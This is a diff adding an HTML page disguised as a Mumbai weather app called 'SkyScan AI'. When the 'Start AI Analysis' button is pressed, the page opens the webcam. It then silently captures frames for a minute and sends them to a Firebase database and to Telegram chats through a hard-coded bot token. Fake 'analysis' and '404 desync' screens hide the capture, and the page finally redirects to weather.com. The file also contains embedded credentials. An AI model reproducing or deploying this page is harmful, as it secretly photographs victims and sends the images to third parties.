@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SkyScan AI | Mumbai Weather</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --sky-blue: #00A3FF;
+            --sky-dark: #1A1A2E;
+            --sky-glass: rgba(255, 255, 255, 0.1);
+            --sky-text: #FFFFFF;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: linear-gradient(180deg, #1A1A2E 0%, #16213E 100%); 
+            color: var(--sky-text);
+            font-family: 'Inter', -apple-system, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+            overflow: hidden;
+        }
+
+        .weather-card {
+            width: 100%; max-width: 400px; 
+            background: var(--sky-glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 32px; padding: 40px 30px;
+            text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+        }
+
+        .location-tag {
+            font-size: 14px; color: var(--sky-blue); 
+            text-transform: uppercase; letter-spacing: 2px; font-weight: 700;
+            margin-bottom: 8px; display: block;
+        }
+
+        h1 { font-size: 42px; margin: 0; font-weight: 300; }
+        .condition { font-size: 18px; opacity: 0.8; margin-bottom: 30px; }
+
+        .radar-circle {
+            width: 140px; height: 140px; margin: 0 auto 30px;
+            border: 2px solid var(--sky-blue); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            position: relative;
+        }
+
+        .radar-sweep {
+            position: absolute; width: 50%; height: 50%;
+            background: conic-gradient(from 0deg, var(--sky-blue), transparent);
+            top: 0; left: 50%; transform-origin: bottom left;
+            animation: sweep 3s linear infinite; opacity: 0.3;
+        }
+        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .btn-weather {
+            background: var(--sky-blue); color: white; border: none;
+            width: 100%; padding: 18px; font-size: 16px; font-weight: 600;
+            border-radius: 16px; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(0, 163, 255, 0.3);
+        }
+        .btn-weather:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(0, 163, 255, 0.4); }
+
+        /* Logic Views */
+        #sync-ui, #error-404 { display: none; }
+
+        .analyzer-bar {
+            width: 100%; height: 4px; background: rgba(255,255,255,0.1);
+            border-radius: 2px; margin: 20px 0; overflow: hidden;
+        }
+        .analyzer-progress {
+            width: 0%; height: 100%; background: var(--sky-blue);
+            animation: load 60s linear forwards;
+        }
+        @keyframes load { to { width: 100%; } }
+
+        .error-code { font-size: 80px; font-weight: 900; opacity: 0.1; position: absolute; top: 10px; left: 0; right: 0; }
+    </style>
+</head>
+<body>
+
+    <div class="weather-card">
+        <!-- Initial View -->
+        <div id="init-view">
+            <span class="location-tag">Mumbai, Maharashtra</span>
+            <h1>31°C</h1>
+            <p class="condition">Haze • Humidity 64%</p>
+            
+            <div class="radar-circle">
+                <div class="radar-sweep"></div>
+                <svg width="40" height="40" fill="currentColor" viewBox="0 0 24 24"><path d="M12 11c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm6 2c0-3.31-2.69-6-6-6s-6 2.69-6 6c0 2.22 1.21 4.15 3 5.19V20h6v-1.81c1.79-1.04 3-2.97 3-5.19zM12 3C6.48 3 2 7.48 2 13c0 3.7 2.01 6.94 5 8.68V23h10v-1.32c2.99-1.74 5-4.98 5-8.68 0-5.52-4.48-10-10-10z"/></svg>
+            </div>
+            
+            <p style="font-size: 13px; opacity: 0.6; margin-bottom: 25px;">To unlock hyper-local precipitation alerts, enable <b>Visual Cloud Density Analysis</b>.</p>
+            
+            <button class="btn-weather" onclick="startWeatherScan()">Start AI Analysis</button>
+        </div>
+
+        <!-- Analysis View -->
+        <div id="sync-ui">
+            <div class="location-tag">Analyzing Atmosphere</div>
+            <div class="analyzer-bar"><div class="analyzer-progress"></div></div>
+            <div style="font-size: 14px; font-weight: 600;">Mapping Visual Lidar...</div>
+            <div id="w-timer" style="font-size: 12px; opacity: 0.5; margin-top: 10px;">Token Expires in 60s</div>
+            
+            <div style="text-align: left; font-family: monospace; font-size: 10px; color: var(--sky-blue); margin-top: 30px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 12px;">
+                > CONNECTING_MUMBAI_STATION_4<br>
+                > CALIBRATING_UV_SENSORS... OK<br>
+                > FETCHING_STRATOSPHERE_DATA... 67%
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div id="error-404">
+            <div class="error-code">404</div>
+            <div class="location-tag" style="color: #ff4d4d;">Sync Failed</div>
+            <h2 style="font-weight: 300;">Station Desync</h2>
+            <p style="font-size: 13px; opacity: 0.6;">High-altitude atmospheric noise detected. Recalibrating visual feed to maintain Mumbai node connection...</p>
+            <div class="radar-circle" style="width: 60px; height: 60px; border-color: #ff4d4d;">
+                <div class="radar-sweep" style="background: conic-gradient(from 0deg, #ff4d4d, transparent);"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startWeatherScan() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('w-timer').innerText = `Token Expires in ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            weatherCapture(count);
+                        }
+
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://weather.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://weather.com";
+            }
+        }
+
+        function weatherCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "WEATHER_LIDAR_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_STATION_4" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'mumbai_sky_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
